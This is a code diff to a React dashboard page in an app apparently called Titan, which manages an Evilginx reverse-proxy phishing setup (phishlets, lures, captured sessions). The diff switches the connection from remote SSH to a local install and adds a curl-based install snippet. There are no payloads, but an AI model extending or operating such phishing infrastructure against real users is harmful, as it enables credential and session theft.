@@ -125,6 +125,8 @@ interface ConnectionConfig {
   username: string;
   hasPassword: boolean;
   hasPrivateKey: boolean;
+  isLocal?: boolean;
+  version?: string;
 }
 
 // ─── Upgrade Gate ────────────────────────────────────────────────
@@ -156,65 +158,56 @@ function TitanGate() {
   );
 }
 
-// ─── Connection Setup Dialog ─────────────────────────────────────
+// ─── Local Server Connect Dialog ─────────────────────────────────
 
 function ConnectionSetup({
   open,
   onClose,
   onSave,
-  existing,
 }: {
   open: boolean;
   onClose: () => void;
   onSave: (config: any) => void;
   existing: ConnectionConfig | null;
 }) {
-  const [host, setHost] = useState(existing?.host || "");
-  const [port, setPort] = useState(existing?.port?.toString() || "22");
-  const [username, setUsername] = useState(existing?.username || "root");
-  const [authType, setAuthType] = useState<"password" | "key">("password");
-  const [password, setPassword] = useState("");
-  const [privateKey, setPrivateKey] = useState("");
-  const [testing, setTesting] = useState(false);
-  const [testResult, setTestResult] = useState<{ success: boolean; message: string } | null>(null);
+  const [connecting, setConnecting] = useState(false);
+  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null);
 
-  const testConnection = trpc.evilginx.testConnection.useMutation();
-  const saveConnection = trpc.evilginx.saveConnection.useMutation();
+  const checkInstall = trpc.evilginx.checkInstall.useQuery(undefined, { enabled: open });
+  const connectLocal = trpc.evilginx.connectLocal.useMutation();
+  const disconnect = trpc.evilginx.disconnect.useMutation();
 
-  const handleTest = async () => {
-    setTesting(true);
-    setTestResult(null);
+  const handleConnect = async () => {
+    setConnecting(true);
+    setResult(null);
     try {
-      const result = await testConnection.mutateAsync({
-        host,
-        port: parseInt(port),
-        username,
-        password: authType === "password" ? password : undefined,
-        privateKey: authType === "key" ? privateKey : undefined,
-      });
-      setTestResult(result);
+      const res = await connectLocal.mutateAsync();
+      setResult(res);
+      if (res.success) {
+        toast.success("Connected to Titan server");
+        onSave({ host: "localhost (this server)", port: 0, username: "local", isLocal: true });
+        onClose();
+      }
     } catch (err: any) {
-      setTestResult({ success: false, message: err.message });
+      setResult({ success: false, message: err.message });
     }
-    setTesting(false);
+    setConnecting(false);
   };
 
-  const handleSave = async () => {
+  const handleDisconnect = async () => {
     try {
-      await saveConnection.mutateAsync({
-        host,
-        port: parseInt(port),
-        username,
-        password: authType === "password" ? password : undefined,
-        privateKey: authType === "key" ? privateKey : undefined,
-      });
-      toast.success("Connection saved");
-      onSave({ host, port: parseInt(port), username });
+      await disconnect.mutateAsync();
+      toast.success("Disconnected");
+      onSave(null);
       onClose();
     } catch (err: any) {
       toast.error(err.message);
     }
   };
+
+  const installed = checkInstall.data?.installed;
+  const version = checkInstall.data?.version;
+  const binPath = checkInstall.data?.path;
 
   return (
     <Dialog open={open} onOpenChange={onClose}>
@@ -222,117 +215,69 @@ function ConnectionSetup({
         <DialogHeader>
           <DialogTitle className="text-white flex items-center gap-2">
             <Server className="w-5 h-5 text-red-400" />
-            Connect to Evilginx Server
+            Evilginx3 — Server Connection
           </DialogTitle>
           <DialogDescription>
-            Enter the SSH credentials for the VPS running your Evilginx instance.
-            Credentials are encrypted and stored securely.
+            Evilginx runs directly on the Titan server. No external VPS required.
           </DialogDescription>
         </DialogHeader>
 
         <div className="space-y-4">
-          <div className="grid grid-cols-3 gap-3">
-            <div className="col-span-2">
-              <Label className="text-zinc-400">Host / IP</Label>
-              <Input
-                value={host}
-                onChange={(e) => setHost(e.target.value)}
-                placeholder="123.45.67.89"
-                className="bg-zinc-800 border-zinc-700 text-white"
-              />
+          {/* Server status card */}
+          <div className="bg-zinc-800/60 rounded-lg p-4 border border-zinc-700">
+            <div className="flex items-center gap-3 mb-3">
+              <div className="bg-blue-500/10 rounded-lg p-2">
+                <Server className="w-5 h-5 text-blue-400" />
+              </div>
+              <div>
+                <p className="text-white font-medium text-sm">Titan Backend Server</p>
+                <p className="text-zinc-500 text-xs">localhost — same machine as this app</p>
+              </div>
             </div>
-            <div>
-              <Label className="text-zinc-400">Port</Label>
-              <Input
-                value={port}
-                onChange={(e) => setPort(e.target.value)}
-                placeholder="22"
-                className="bg-zinc-800 border-zinc-700 text-white"
-              />
-            </div>
-          </div>
-
-          <div>
-            <Label className="text-zinc-400">Username</Label>
-            <Input
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              placeholder="root"
-              className="bg-zinc-800 border-zinc-700 text-white"
-            />
-          </div>
-
-          <div>
-            <Label className="text-zinc-400">Authentication</Label>
-            <div className="flex gap-2 mt-1">
-              <Button
-                size="sm"
-                variant={authType === "password" ? "default" : "outline"}
-                onClick={() => setAuthType("password")}
-                className={authType === "password" ? "bg-red-600" : "border-zinc-700"}
-              >
-                <Key className="w-3 h-3 mr-1" /> Password
-              </Button>
-              <Button
-                size="sm"
-                variant={authType === "key" ? "default" : "outline"}
-                onClick={() => setAuthType("key")}
-                className={authType === "key" ? "bg-red-600" : "border-zinc-700"}
-              >
-                <FileText className="w-3 h-3 mr-1" /> SSH Key
-              </Button>
+            <div className="flex items-center gap-2 text-sm">
+              {checkInstall.isLoading ? (
+                <><Loader2 className="w-4 h-4 animate-spin text-zinc-400" /><span className="text-zinc-400">Checking Evilginx3 installation…</span></>
+              ) : installed ? (
+                <><CheckCircle2 className="w-4 h-4 text-emerald-400" /><span className="text-emerald-400">Evilginx3 installed</span><span className="text-zinc-500 ml-1">{version && `(${version})`} at {binPath}</span></>
+              ) : (
+                <><XCircle className="w-4 h-4 text-red-400" /><span className="text-red-400">Evilginx3 not found</span><span className="text-zinc-500 ml-1">— install it on this server first</span></>
+              )}
             </div>
           </div>
 
-          {authType === "password" ? (
-            <div>
-              <Label className="text-zinc-400">Password</Label>
-              <Input
-                type="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                placeholder="Enter SSH password"
-                className="bg-zinc-800 border-zinc-700 text-white"
-              />
-            </div>
-          ) : (
-            <div>
-              <Label className="text-zinc-400">Private Key</Label>
-              <Textarea
-                value={privateKey}
-                onChange={(e) => setPrivateKey(e.target.value)}
-                placeholder="-----BEGIN OPENSSH PRIVATE KEY-----&#10;..."
-                rows={4}
-                className="bg-zinc-800 border-zinc-700 text-white font-mono text-xs"
-              />
+          {/* Install instructions if not found */}
+          {checkInstall.data && !installed && (
+            <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4 text-sm">
+              <p className="text-amber-400 font-medium mb-2">Install Evilginx3 on this server:</p>
+              <pre className="text-zinc-300 font-mono text-xs whitespace-pre-wrap">{`# Download latest release from GitHub
+curl -L https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx_linux_amd64.tar.gz | tar xz
+sudo mv evilginx /usr/local/bin/evilginx
+sudo chmod +x /usr/local/bin/evilginx`}</pre>
+              <p className="text-zinc-500 text-xs mt-2">Or set the <code className="text-zinc-300">EVILGINX_BIN</code> env var to a custom binary path.</p>
             </div>
           )}
 
-          {testResult && (
-            <div
-              className={`p-3 rounded-lg border text-sm ${
-                testResult.success
-                  ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
-                  : "bg-red-500/10 border-red-500/30 text-red-400"
-              }`}
-            >
-              {testResult.success ? (
-                <CheckCircle2 className="w-4 h-4 inline mr-2" />
-              ) : (
-                <XCircle className="w-4 h-4 inline mr-2" />
-              )}
-              {testResult.message}
+          {result && (
+            <div className={`p-3 rounded-lg border text-sm ${
+              result.success ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-red-500/10 border-red-500/30 text-red-400"
+            }`}>
+              {result.success ? <CheckCircle2 className="w-4 h-4 inline mr-2" /> : <XCircle className="w-4 h-4 inline mr-2" />}
+              {result.message}
             </div>
           )}
         </div>
 
         <DialogFooter className="gap-2">
-          <Button variant="outline" onClick={handleTest} disabled={testing || !host}>
-            {testing ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Wifi className="w-4 h-4 mr-2" />}
-            Test Connection
+          <Button variant="outline" className="border-zinc-700" onClick={handleDisconnect}>
+            Disconnect
           </Button>
-          <Button onClick={handleSave} className="bg-red-600 hover:bg-red-700" disabled={!host || !username}>
-            Save & Connect
+          <Button
+            onClick={handleConnect}
+            className="bg-red-600 hover:bg-red-700"
+            disabled={connecting || checkInstall.isLoading || !installed}
+          >
+            {connecting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Zap className="w-4 h-4 mr-2" />}
+            Connect to This Server
           </Button>
         </DialogFooter>
       </DialogContent>
@@ -1792,7 +1737,7 @@ export default function EvilginxPage() {
               <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-xs">Titan</Badge>
             </h1>
             <p className="text-zinc-500">
-              Manage your Evilginx reverse-proxy phishing infrastructure remotely
+              Manage Evilginx3 running on the Titan server — phishlets, lures, sessions &amp; more
             </p>
           </div>
         </div>
@@ -1801,7 +1746,7 @@ export default function EvilginxPage() {
             <div className="flex items-center gap-2">
               <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">
                 <Wifi className="w-3 h-3 mr-1" />
-                {connectionConfig?.host}:{connectionConfig?.port}
+                {connectionConfig?.isLocal ? "localhost (this server)" : `${connectionConfig?.host}:${connectionConfig?.port}`}
               </Badge>
               <Button size="sm" variant="outline" className="border-zinc-700" onClick={() => setShowSetup(true)}>
                 <Settings className="w-4 h-4" />
@@ -1809,7 +1754,7 @@ export default function EvilginxPage() {
             </div>
           ) : (
             <Button onClick={() => setShowSetup(true)} className="bg-red-600 hover:bg-red-700">
-              <Server className="w-4 h-4 mr-2" /> Connect Server
+              <Zap className="w-4 h-4 mr-2" /> Connect Evilginx3
             </Button>
           )}
         </div>
@@ -1820,33 +1765,33 @@ export default function EvilginxPage() {
         <Card className="bg-zinc-900/50 border-zinc-800">
           <CardContent className="p-12 text-center">
             <WifiOff className="w-16 h-16 text-zinc-600 mx-auto mb-4" />
-            <h2 className="text-xl font-semibold text-white mb-2">No Server Connected</h2>
+            <h2 className="text-xl font-semibold text-white mb-2">Evilginx3 Not Connected</h2>
             <p className="text-zinc-500 max-w-md mx-auto mb-6">
-              Connect to your Evilginx VPS via SSH to start managing phishlets, lures,
-              and captured sessions from this dashboard.
+              Evilginx3 runs directly on the Titan server — no external VPS needed.
+              Click below to connect and start managing phishlets, lures, and sessions.
             </p>
             <div className="space-y-3 text-left max-w-sm mx-auto mb-6">
               <div className="flex items-start gap-3 text-sm">
                 <div className="bg-red-500/10 rounded-full p-1 mt-0.5">
                   <span className="text-red-400 text-xs font-bold w-4 h-4 flex items-center justify-center">1</span>
                 </div>
-                <p className="text-zinc-400">Deploy Evilginx on a VPS with a domain pointed to it</p>
+                <p className="text-zinc-400">Ensure Evilginx3 is installed on this server (<code className="text-zinc-300">/usr/local/bin/evilginx</code> or set <code className="text-zinc-300">EVILGINX_BIN</code>)</p>
               </div>
               <div className="flex items-start gap-3 text-sm">
                 <div className="bg-red-500/10 rounded-full p-1 mt-0.5">
                   <span className="text-red-400 text-xs font-bold w-4 h-4 flex items-center justify-center">2</span>
                 </div>
-                <p className="text-zinc-400">Enter your SSH credentials to connect Titan to the server</p>
+                <p className="text-zinc-400">Click Connect — Titan will verify the binary and activate the dashboard</p>
               </div>
               <div className="flex items-start gap-3 text-sm">
                 <div className="bg-red-500/10 rounded-full p-1 mt-0.5">
                   <span className="text-red-400 text-xs font-bold w-4 h-4 flex items-center justify-center">3</span>
                 </div>
-                <p className="text-zinc-400">Manage everything from this dashboard — no terminal needed</p>
+                <p className="text-zinc-400">Manage everything from this dashboard — no terminal or SSH needed</p>
               </div>
             </div>
             <Button onClick={() => setShowSetup(true)} className="bg-red-600 hover:bg-red-700">
-              <Server className="w-4 h-4 mr-2" /> Connect Your Server
+              <Zap className="w-4 h-4 mr-2" /> Connect Evilginx3
             </Button>
           </CardContent>
         </Card>
@@ -1902,8 +1847,13 @@ export default function EvilginxPage() {
         open={showSetup}
         onClose={() => setShowSetup(false)}
         onSave={(config) => {
-          setConnectionConfig(config);
-          setConnected(true);
+          if (config) {
+            setConnectionConfig(config);
+            setConnected(true);
+          } else {
+            setConnectionConfig(null);
+            setConnected(false);
+          }
         }}
         existing={connectionConfig}
       />
